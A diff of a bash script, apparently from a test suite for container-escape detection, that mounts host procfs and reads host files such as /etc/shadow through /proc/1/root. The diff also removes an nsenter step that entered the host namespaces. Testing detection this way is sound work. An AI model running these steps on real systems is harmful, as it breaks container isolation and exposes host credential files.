@@ -1,7 +1,7 @@
 #!/bin/bash
 # ATTACK 2 — Privileged Container Escape
-# A --privileged container mounts host procfs, reads /proc/1/root,
-# and uses nsenter to break into the host PID namespace.
+# A --privileged container mounts host procfs and reads host files
+# via /proc/1/root (no nsenter — that's attack 5).
 set -e
 
 echo "=== ATTACK 2: Privileged Container Escape ==="
@@ -18,7 +18,7 @@ else
     exit 1
 fi
 
-# Step 1: Mount host procfs
+# Step 1: Mount host procfs (triggers mount() syscall)
 echo "[*] Mounting host procfs..."
 mkdir -p /tmp/hostproc
 if mount -t proc proc /tmp/hostproc 2>/dev/null; then
@@ -29,20 +29,16 @@ else
     echo "[-] mount(proc) failed"
 fi
 
-# Step 2: Read host files via /proc/1/root
+# Step 2: Read host files via /proc/1/root (triggers openat on /proc/1/root/*)
 echo "[*] Reading host files via /proc/1/root..."
 HOSTNAME=$(cat /proc/1/root/etc/hostname 2>/dev/null)
 [ -n "$HOSTNAME" ] && echo "[!] ESCAPED — host hostname: $HOSTNAME"
 
+HOST_OS=$(cat /proc/1/root/etc/os-release 2>/dev/null | grep PRETTY_NAME | head -1)
+[ -n "$HOST_OS" ] && echo "[!] ESCAPED — host OS: $HOST_OS"
+
 if cat /proc/1/root/etc/shadow >/dev/null 2>&1; then
     echo "[!] ESCAPED — can read host /etc/shadow ($(wc -l < /proc/1/root/etc/shadow) entries)"
-fi
-
-# Step 3: nsenter into host namespaces
-echo "[*] Attempting nsenter into host PID 1..."
-if command -v nsenter >/dev/null 2>&1; then
-    RESULT=$(nsenter -t 1 -m -u -i -n -p -- hostname 2>/dev/null)
-    [ -n "$RESULT" ] && echo "[!] ESCAPED — nsenter succeeded: $RESULT"
 fi
 
 echo ""
